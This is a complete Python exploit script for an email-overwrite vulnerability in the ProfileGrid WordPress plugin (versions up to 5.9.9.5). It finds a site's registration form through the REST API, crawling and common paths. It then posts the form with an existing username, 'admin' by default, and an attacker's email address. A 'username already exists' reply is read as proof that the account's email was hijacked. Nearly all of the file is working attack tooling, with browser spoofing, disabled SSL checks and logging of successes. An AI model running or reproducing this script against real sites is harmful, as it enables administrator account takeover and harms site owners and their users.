#!/usr/bin/env python3
"""
ProfileGrid <= 5.9.9.5 Single Target Exploit
- Single target mode with precise form detection
- REST API + page discovery for registration form
- Debug mode for verbose output
- Improved validation and error handling

Usage:
  python3 sin.py --url "https://example.com/register-form/" --email "attacker@example.com" --debug
"""

from __future__ import annotations

import argparse
import asyncio
import html
import json
import re
import sys
import time
import urllib.parse
from html.parser import HTMLParser
from typing import List, Optional

try:
    import aiohttp
    import aiohttp.client_exceptions
except ImportError:
    print("[-] aiohttp not installed. Run: pip install aiohttp")
    sys.exit(1)

# ------------- BANNER -------------
BANNER = r"""
  ____  _   _    ____  _   _
 / ___|| | | |  / ___|| | | |
 \___ \| |_| | | |  _ | |_| |
  ___) |  _  | | |_| ||  _  |
 |____/|_| |_|  \____||_| |_|

   ProfileGrid Single Target
"""

# ------------- GLOBALS / STATE -------------
DEBUG = False


def debug(msg: str) -> None:
    """Print debug messages when --debug is enabled."""
    if DEBUG:
        ts = time.strftime("%H:%M:%S")
        print(f"  [DBG {ts}] {msg}")


def info(msg: str) -> None:
    print(f"[+] {msg}")


def warn(msg: str) -> None:
    print(f"[!] {msg}")


def error(msg: str) -> None:
    print(f"[-] {msg}", file=sys.stderr)


def fail(msg: str) -> None:
    error(msg)
    raise SystemExit(1)


# ------------- HTML PARSERS -------------
class FormParser(HTMLParser):
    """Parse all <form> elements and their child inputs from HTML."""

    def __init__(self) -> None:
        super().__init__()
        self.forms: list[dict[str, object]] = []
        self._current: dict[str, object] | None = None

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        attr = {k.lower(): (v or "") for k, v in attrs}
        if tag.lower() == "form":
            self._current = {"attrs": attr, "inputs": []}
            return
        if self._current is not None and tag.lower() in {"input", "textarea", "select"}:
            inputs = self._current["inputs"]
            assert isinstance(inputs, list)
            inputs.append(attr)

    def handle_endtag(self, tag: str) -> None:
        if tag.lower() == "form" and self._current is not None:
            self.forms.append(self._current)
            self._current = None


class LinkParser(HTMLParser):
    """Extract all href links from HTML."""

    def __init__(self) -> None:
        super().__init__()
        self.links: list[str] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        if tag.lower() != "a":
            return
        attr = {k.lower(): (v or "") for k, v in attrs}
        href = attr.get("href", "")
        if href:
            self.links.append(html.unescape(href))


# ------------- UTILITY FUNCTIONS -------------
def parse_field_overrides(values: list[str]) -> dict[str, str]:
    """Parse --field key=value pairs into a dict."""
    overrides: dict[str, str] = {}
    for item in values:
        if "=" not in item:
            fail(f"--field format must be key=value: {item}")
        key, value = item.split("=", 1)
        key = key.strip()
        if not key:
            fail("--field key cannot be empty")
        overrides[key] = value
    return overrides


def is_profilegrid_form(html_content: str) -> bool:
    """Check if HTML contains a ProfileGrid registration form."""
    h = html_content.lower()
    markers = [
        'pm_regform_',
        'name="reg_form_submit"',
        "name='reg_form_submit'",
        'pm_registration_nonce',
        '[profilegrid_register',
        'profilegrid_register',
        'pm-group-registration',
    ]
    for marker in markers:
        if marker in h:
            debug(f"ProfileGrid marker found: {marker}")
            return True
    return False


def normalize_url(base: str, href: str) -> str | None:
    """Normalize a relative URL to absolute, ensuring same host."""
    absolute = urllib.parse.urljoin(base, href)
    parsed = urllib.parse.urlparse(absolute)
    if parsed.scheme not in {"http", "https"}:
        return None
    base_parsed = urllib.parse.urlparse(base)
    if (base_parsed.scheme, base_parsed.hostname) != (parsed.scheme, parsed.hostname):
        return None
    return urllib.parse.urlunparse(
        (parsed.scheme, parsed.netloc, parsed.path or "/", "", parsed.query, "")
    )


# ------------- ASYNC HTTP -------------
async def async_request(
    session: aiohttp.ClientSession,
    url: str,
    *,
    data: dict[str, str] | None = None,
    timeout: int = 20,
    method: str | None = None,
) -> tuple[int, str, str]:
    """Perform async HTTP request with realistic browser headers."""
    headers = {
        "User-Agent": (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
            "AppleWebKit/537.36 (KHTML, like Gecko) "
            "Chrome/125.0.0.0 Safari/537.36"
        ),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }

    resolved_method = method or ("POST" if data else "GET")
    debug(f"{resolved_method} {url}")

    try:
        ct = aiohttp.ClientTimeout(total=timeout)
        if data:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            async with session.post(
                url, data=data, headers=headers, timeout=ct, ssl=False,
                allow_redirects=True, max_redirects=5
            ) as resp:
                body = await resp.text(errors="replace")
                debug(f"  -> HTTP {resp.status} | {len(body)} bytes | Final URL: {resp.url}")
                return resp.status, str(resp.url), body
        else:
            async with session.get(
                url, headers=headers, timeout=ct, ssl=False,
                allow_redirects=True, max_redirects=5
            ) as resp:
                body = await resp.text(errors="replace")
                debug(f"  -> HTTP {resp.status} | {len(body)} bytes | Final URL: {resp.url}")
                return resp.status, str(resp.url), body
    except asyncio.TimeoutError:
        raise Exception(f"Request timed out after {timeout}s: {url}")
    except aiohttp.ClientError as e:
        raise Exception(f"HTTP error: {e}")


# ------------- FORM PROCESSING -------------
def parse_forms(body: str) -> list[dict[str, object]]:
    """Parse all forms from HTML body."""
    parser_obj = FormParser()
    parser_obj.feed(body)
    debug(f"Parsed {len(parser_obj.forms)} form(s) from page")
    return parser_obj.forms


def find_profilegrid_form(forms: list[dict[str, object]]) -> dict[str, object] | None:
    """Locate the ProfileGrid registration form among parsed forms."""
    for i, form in enumerate(forms):
        attrs = form["attrs"]
        inputs = form["inputs"]
        assert isinstance(attrs, dict)
        assert isinstance(inputs, list)

        names = {field.get("name", "") for field in inputs}
        form_id = str(attrs.get("id", ""))
        form_name = str(attrs.get("name", ""))
        form_action_val = str(attrs.get("action", ""))
        form_class = str(attrs.get("class", ""))

        debug(f"  Form #{i}: id='{form_id}' name='{form_name}' action='{form_action_val}' "
              f"class='{form_class}' fields={len(inputs)}")
        debug(f"    Field names: {sorted(names)}")

        # Primary detection: known ProfileGrid identifiers
        if "reg_form_submit" in names:
            debug(f"  -> MATCH: reg_form_submit field found")
            return form
        if form_id.startswith("pm_regform_"):
            debug(f"  -> MATCH: form id starts with pm_regform_")
            return form
        if form_name.startswith("pm_regform_"):
            debug(f"  -> MATCH: form name starts with pm_regform_")
            return form

        # Secondary: check for ProfileGrid nonce fields
        if "pm_registration_nonce" in names or "_pm_registration_nonce" in names:
            debug(f"  -> MATCH: ProfileGrid nonce field found")
            return form

        # Tertiary: check class names
        if "pm-group-registration" in form_class:
            debug(f"  -> MATCH: pm-group-registration class found")
            return form

    return None


def get_form_action(base_url: str, form: dict[str, object]) -> str:
    """Resolve the form's action URL."""
    attrs = form["attrs"]
    assert isinstance(attrs, dict)
    action = str(attrs.get("action", "")).strip()
    if not action:
        debug(f"Form has no action, using base URL: {base_url}")
        return base_url
    resolved = urllib.parse.urljoin(base_url, html.unescape(action))
    debug(f"Form action resolved: {action} -> {resolved}")
    return resolved


def collect_form_values(form: dict[str, object]) -> dict[str, str]:
    """Collect all default values from a form's inputs."""
    inputs = form["inputs"]
    assert isinstance(inputs, list)
    data: dict[str, str] = {}

    for field in inputs:
        name = field.get("name", "")
        if not name:
            continue
        input_type = field.get("type", "text").lower()

        # Skip non-submittable types
        if input_type in {"button", "file", "image", "reset"}:
            continue
        # Skip unchecked checkboxes / radios
        if input_type in {"checkbox", "radio"} and "checked" not in field:
            continue

        value = html.unescape(str(field.get("value", "")))
        data[str(name)] = value
        debug(f"  Field: {name} = '{value}' (type={input_type})")

    # Ensure reg_form_submit is present
    data.setdefault("reg_form_submit", "Submit")
    return data


def print_payload(data: dict[str, str]) -> None:
    """Print the POST payload, masking sensitive values."""
    info("POST payload:")
    for key in sorted(data):
        value = data[key]
        if any(s in key.lower() for s in ("pass", "nonce", "token", "csrf")):
            value = "<present>"
        print(f"    {key} = {value}")


def print_response_snippets(body: str) -> None:
    """Extract and print ProfileGrid response messages."""
    snippets = re.findall(
        r'<div[^>]+class="[^"]*pm-(?:error|message|success)[^"]*"[^>]*>(.*?)</div>',
        body, flags=re.I | re.S,
    )
    if not snippets:
        # Also look for generic WP messages
        wp_snippets = re.findall(
            r'<div[^>]+class="[^"]*(?:woocommerce-message|alert|notice)[^"]*"[^>]*>(.*?)</div>',
            body, flags=re.I | re.S,
        )
        snippets = wp_snippets

    if snippets:
        info("Response messages:")
        for snippet in snippets[:10]:
            text = re.sub(r"<[^>]+>", " ", snippet)
            text = " ".join(html.unescape(text).split())
            if text:
                print(f"    {text[:300]}")


def analyze_response(status: int, body: str) -> tuple[bool, str]:
    """
    Analyze the POST response for ProfileGrid <= 5.9.9.5 email overwrite CVE.

    KEY INSIGHT: The vulnerable code updates the user's email BEFORE checking
    if the username already exists. So the flow is:
      1. Receive POST with user_login=admin, user_email=attacker@evil.com
      2. BUG: Update existing user's email -> attacker@evil.com  (DONE!)
      3. Try to insert new user with username 'admin'
      4. Fail with "username already exists"

    Therefore "username already exists" = email was ALREADY overwritten = SUCCESS.
    """
    lowered = body.lower()

    # ── HARD BLOCKERS: These mean the request was rejected before processing ──
    hard_fail_markers = [
        ("registration is currently disabled", "Registration is disabled on this site"),
        ("security check failed", "Nonce/security token check failed"),
        ("nonce verification failed", "Nonce verification failed"),
        ("spam detected", "Anti-spam protection triggered"),
        ("captcha", "CAPTCHA challenge blocked submission"),
        ("invalid email", "Server rejected the email address format"),
        ("not allowed to register", "Registration not allowed"),
        ("registration is not open", "Registration is closed"),
    ]

    for marker, reason in hard_fail_markers:
        if marker in lowered:
            return False, reason

    # HTTP error status (server-level block)
    if status >= 500:
        return False, f"Server error (HTTP {status})"

    # ── SUCCESS INDICATORS: Signs the exploit worked ──
    # "username already exists" / "already registered" = the CVE's expected response!
    # The email was updated BEFORE this error was generated.
    exploit_success_markers = [
        ("username already exists", "Email overwrite SUCCESSFUL (username collision confirms server processed the data)"),
        ("already registered", "Email overwrite SUCCESSFUL (user was processed, collision detected after email update)"),
        ("user already exists", "Email overwrite SUCCESSFUL (duplicate user error = email was changed)"),
        ("username is already taken", "Email overwrite SUCCESSFUL (username taken = email was already updated)"),
        ("login already in use", "Email overwrite SUCCESSFUL (login collision = email overwritten)"),
    ]

    for marker, reason in exploit_success_markers:
        if marker in lowered:
            return True, reason

    # Standard registration success messages
    standard_success_markers = [
        ("successfully registered", "Registration confirmed successful"),
        ("registration successful", "Registration confirmed successful"),
        ("account has been created", "Account creation confirmed"),
        ("check your email", "Email verification sent - likely successful"),
        ("pm-success", "ProfileGrid success indicator detected"),
    ]

    for marker, reason in standard_success_markers:
        if marker in lowered:
            return True, reason

    # "email already registered" with OUR email = also means it worked (re-run scenario)
    if "email already registered" in lowered or "email address is already used" in lowered:
        return True, "Email already associated (likely from a previous successful exploit)"

    # pm-error WITH no hard-fail keywords = might still have worked
    # (ProfileGrid shows pm-error div for username-exists too)
    if "pm-error" in lowered:
        # Extract the actual error text to report
        error_snippets = re.findall(
            r'<div[^>]*class="[^"]*pm-error[^"]*"[^>]*>(.*?)</div>',
            body, flags=re.I | re.S,
        )
        error_text = ""
        for s in error_snippets:
            error_text += " " + re.sub(r"<[^>]+>", " ", s)
        error_text = " ".join(error_text.split()).strip()

        # Check if the pm-error text contains our success markers
        et_lower = error_text.lower()
        for marker, reason in exploit_success_markers:
            if marker in et_lower:
                return True, reason

        # Otherwise it's a real error
        if error_text:
            return False, f"ProfileGrid error: {error_text[:200]}"
        return False, "ProfileGrid error (unknown)"

    # Redirect after POST often means success
    if status in (301, 302, 303):
        return True, f"Redirect (HTTP {status}) - likely successful"

    # pm-message div present = success message
    if "pm-message" in lowered:
        return True, "ProfileGrid success message detected"

    # No error indicators and status OK = cautiously positive
    if 200 <= status < 400:
        return True, "No error indicators found (cautious positive)"

    return False, f"Uncertain result (HTTP {status})"



# ------------- DISCOVERY -------------
async def fetch_rest_pages(
    session: aiohttp.ClientSession, base_url: str, max_pages: int = 5
) -> List[str]:
    """Discover ProfileGrid pages via WordPress REST API."""
    urls = []
    debug("Checking WordPress REST API for pages...")

    for page in range(1, max_pages + 1):
        api_url = urllib.parse.urljoin(
            base_url, f"/wp-json/wp/v2/pages?per_page=100&page={page}"
        )
        try:
            status, _, body = await async_request(session, api_url, timeout=10)
        except Exception as e:
            debug(f"REST API page {page} failed: {e}")
            break

        if status != 200:
            debug(f"REST API returned HTTP {status}, stopping")
            break

        try:
            pages = json.loads(body)
        except json.JSONDecodeError:
            debug("REST API response is not valid JSON")
            break

        if not isinstance(pages, list) or not pages:
            break

        for p in pages:
            if not isinstance(p, dict):
                continue
            link = p.get("link")
            content = p.get("content", {})
            rendered = content.get("rendered", "") if isinstance(content, dict) else ""
            title = p.get("title", {})
            title_text = title.get("rendered", "") if isinstance(title, dict) else ""
            haystack = f"{link} {title_text} {rendered}".lower()

            pg_keywords = [
                "[profilegrid_register",
                "pm_regform_",
                "reg_form_submit",
                "profilegrid_register",
                "pm-group-registration",
            ]
            if link and any(kw in haystack for kw in pg_keywords):
                debug(f"REST API found candidate: {link}")
                urls.append(link)

    debug(f"REST API discovery found {len(urls)} candidate(s)")
    return urls


async def discover_registration_pages(
    session: aiohttp.ClientSession, base_url: str, use_rest: bool = True
) -> List[str]:
    """Discover all ProfileGrid registration pages from a base URL."""
    if not base_url.endswith("/"):
        base_url += "/"

    candidates: set[str] = set()

    # 1. REST API discovery
    if use_rest:
        info("Discovering via REST API...")
        for url in await fetch_rest_pages(session, base_url):
            if url:
                candidates.add(url)

    # 2. Homepage link extraction
    info("Scanning homepage for links...")
    try:
        status, final_url, body = await async_request(session, base_url, timeout=15)
        if status == 200:
            parser_obj = LinkParser()
            parser_obj.feed(body)
            for link in parser_obj.links:
                normalized = normalize_url(base_url, link)
                if normalized:
                    candidates.add(normalized)
            debug(f"Found {len(parser_obj.links)} links on homepage")

            # Also check homepage itself
            if is_profilegrid_form(body):
                debug("Homepage itself contains ProfileGrid form!")
                candidates.add(final_url)
    except Exception as e:
        debug(f"Homepage scan failed: {e}")

    # 3. Common registration paths
    common_paths = [
        "registration/", "register/", "signup/", "sign-up/",
        "profilegrid-register/", "profilegrid-registration/",
        "user-registration/", "groups/", "create-account/",
        "join/", "membership/",
    ]
    for path in common_paths:
        candidates.add(urllib.parse.urljoin(base_url, path))

    debug(f"Total candidates to probe: {len(candidates)}")

    # 4. Probe each candidate for ProfileGrid form signature
    found = []
    for url in candidates:
        try:
            status, final_url, body = await async_request(session, url, timeout=10)
        except Exception:
            continue
        if status >= 400:
            continue
        if is_profilegrid_form(body):
            debug(f"CONFIRMED ProfileGrid form at: {final_url}")
            found.append(final_url)

    return found


# ------------- MAIN ATTACK LOGIC -------------
async def attack_single_target(
    session: aiohttp.ClientSession,
    registration_url: str,
    args: argparse.Namespace,
) -> tuple[bool, str]:
    """Attack a single registration URL."""

    # Step 1: Fetch the registration page
    info(f"Fetching: {registration_url}")
    try:
        status, final_url, body = await async_request(session, registration_url, timeout=20)
    except Exception as e:
        return False, f"Failed to fetch page: {e}"

    if status >= 400:
        return False, f"Page returned HTTP {status}"

    debug(f"Page loaded: {len(body)} bytes, final URL: {final_url}")

    # Step 2: Verify ProfileGrid form presence
    if not is_profilegrid_form(body):
        return False, "No ProfileGrid registration form detected on this page"

    # Step 3: Parse and locate the form
    forms = parse_forms(body)
    if not forms:
        return False, "No HTML forms found on the page"

    form = find_profilegrid_form(forms)
    if form is None:
        return False, (
            f"Found {len(forms)} form(s) but none match ProfileGrid signature. "
            "Use --debug for details."
        )

    info("ProfileGrid registration form located!")

    # Step 4: Inspect form fields
    inputs = form.get("inputs", [])
    assert isinstance(inputs, list)
    has_user_login = any(field.get("name") == "user_login" for field in inputs)

    if has_user_login:
        debug("user_login field found in form (normal for ProfileGrid <= 5.9.9.5)")
    else:
        debug("user_login field NOT in form HTML — will be injected via POST")

    # Step 5: Build POST data
    action_url = get_form_action(final_url, form)
    data = collect_form_values(form)

    # Inject exploit values
    data["user_login"] = args.existing_login
    data["user_email"] = args.email
    data["user_pass"] = data.get("user_pass") or args.password
    data["confirm_pass"] = data.get("confirm_pass") or args.password

    # Apply field overrides
    if args.field:
        data.update(parse_field_overrides(args.field))

    # Show payload
    print_payload(data)
    info(f"Action URL: {action_url}")

    # Step 6: Dry-run check
    if not args.send:
        warn("DRY-RUN mode: POST will NOT be sent. Use --send to execute.")
        return False, "Dry-run (use --send to actually submit)"

    # Step 7: Submit
    info("Sending POST request...")
    try:
        post_status, post_url, post_body = await async_request(
            session, action_url, data=data, timeout=25
        )
    except Exception as e:
        return False, f"POST request failed: {e}"

    info(f"Response: HTTP {post_status}")
    print_response_snippets(post_body)

    if DEBUG:
        # Save response body for inspection
        try:
            with open("debug_response.html", "w", encoding="utf-8") as f:
                f.write(post_body)
            debug("Full response saved to debug_response.html")
        except Exception:
            pass

    # Step 8: Analyze result
    success, reason = analyze_response(post_status, post_body)
    return success, reason


async def async_main(args: argparse.Namespace) -> None:
    """Main async entry point."""
    global DEBUG
    DEBUG = args.debug

    print(BANNER)

    target_url = args.url

    # Validate URL
    parsed = urllib.parse.urlparse(target_url)
    if parsed.scheme not in ("http", "https"):
        fail(f"Invalid URL scheme: {parsed.scheme}. Use http:// or https://")
    if not parsed.hostname:
        fail("Invalid URL: no hostname found")

    info(f"Target: {target_url}")
    info(f"Email:  {args.email}")
    info(f"Login:  {args.existing_login}")
    if args.debug:
        info("Debug mode: ON")
    if not args.send:
        warn("Dry-run mode (use --send to actually send POST)")
    print()

    connector = aiohttp.TCPConnector(ssl=False, limit=10)
    cookie_jar = aiohttp.CookieJar(unsafe=True)
    async with aiohttp.ClientSession(connector=connector, cookie_jar=cookie_jar) as session:

        # Determine if URL is direct registration page or base URL
        registration_urls: list[str] = []

        # First, check if the given URL directly contains a ProfileGrid form
        info("Checking if target URL contains a registration form...")
        try:
            status, final_url, body = await async_request(session, target_url, timeout=20)
            if status < 400 and is_profilegrid_form(body):
                info("Direct registration form found at target URL!")
                registration_urls = [final_url]
        except Exception as e:
            debug(f"Direct check failed: {e}")

        # If not found directly, run discovery
        if not registration_urls and args.auto_discover:
            info("No form at target URL, running auto-discovery...")
            registration_urls = await discover_registration_pages(
                session, target_url, use_rest=not args.no_rest
            )

        if not registration_urls:
            # Last resort: try the URL as-is (maybe JavaScript-rendered form)
            warn("No ProfileGrid form detected. Attempting to use target URL as-is...")
            registration_urls = [target_url]

        if len(registration_urls) > 1:
            info(f"Found {len(registration_urls)} registration page(s):")
            for url in registration_urls:
                print(f"    {url}")
            print()

        # Attack each discovered registration URL
        results: list[tuple[str, bool, str]] = []
        for reg_url in registration_urls:
            print(f"\n{'='*60}")
            info(f"Targeting: {reg_url}")
            print(f"{'='*60}")
            success, msg = await attack_single_target(session, reg_url, args)
            results.append((reg_url, success, msg))

        # Summary
        print(f"\n{'='*60}")
        info("RESULTS SUMMARY")
        print(f"{'='*60}")
        for url, success, msg in results:
            status_str = "SUCCESS" if success else "FAILED"
            icon = "[+]" if success else "[-]"
            print(f"  {icon} [{status_str}] {url}")
            print(f"       Reason: {msg}")

        successful = [(url, msg) for url, success, msg in results if success]
        if successful:
            info(f"\nSuccessful: {len(successful)} / {len(results)}")
            for url, msg in successful:
                try:
                    with open(args.output, "a", encoding="utf-8") as f:
                        f.write(f"{url}\n")
                except Exception as e:
                    error(f"Failed to write to output file: {e}")
            info(f"Results saved to: {args.output}")
        else:
            warn(f"No successful results ({len(results)} attempted)")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="ProfileGrid <= 5.9.9.5 Single Target Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dry-run (inspect payload without sending):
  python3 sin.py --url "https://example.com/register/" --email "test@example.com" --debug

  # Actually send the exploit:
  python3 sin.py --url "https://example.com/register/" --email "test@example.com" --send

  # Auto-discover registration page from base URL:
  python3 sin.py --url "https://example.com/" --email "test@example.com" --auto-discover --send

  # Force even if user_login field is visible:
  python3 sin.py --url "https://example.com/register/" --email "test@example.com" --send --force
        """,
    )

    # Required arguments
    parser.add_argument(
        "--url", required=True,
        help="Target URL (registration page or base URL with --auto-discover)",
    )
    parser.add_argument(
        "--email", required=True,
        help="Attacker email address for registration",
    )

    # Optional arguments
    parser.add_argument(
        "--existing-login", default="admin",
        help="Target username to hijack (default: admin)",
    )
    parser.add_argument(
        "--password", default="PocPassword123!",
        help="Password for registration (default: PocPassword123!)",
    )
    parser.add_argument(
        "--field", action="append", default=[],
        help="Additional form field override (format: key=value, repeatable)",
    )

    # Behavior flags
    parser.add_argument(
        "--send", action="store_true",
        help="Actually send the POST request (default is dry-run)",
    )
    parser.add_argument(
        "--auto-discover", action="store_true",
        help="Auto-discover registration pages via REST API + crawling",
    )
    parser.add_argument(
        "--no-rest", action="store_true",
        help="Disable REST API discovery (faster)",
    )
    parser.add_argument(
        "--debug", action="store_true",
        help="Enable verbose debug output",
    )
    parser.add_argument(
        "--output", default="success.txt",
        help="Output file for successful results (default: success.txt)",
    )
    parser.add_argument(
        "--timeout", type=int, default=20,
        help="Request timeout in seconds (default: 20)",
    )

    args = parser.parse_args()

    # Validate email format
    if not re.match(r"^[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}$", args.email):
        fail(f"Invalid email format: {args.email}")

    # Validate URL
    if not args.url.startswith(("http://", "https://")):
        fail("URL must start with http:// or https://")

    try:
        asyncio.run(async_main(args))
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user.")
        sys.exit(1)


if __name__ == "__main__":
    main()
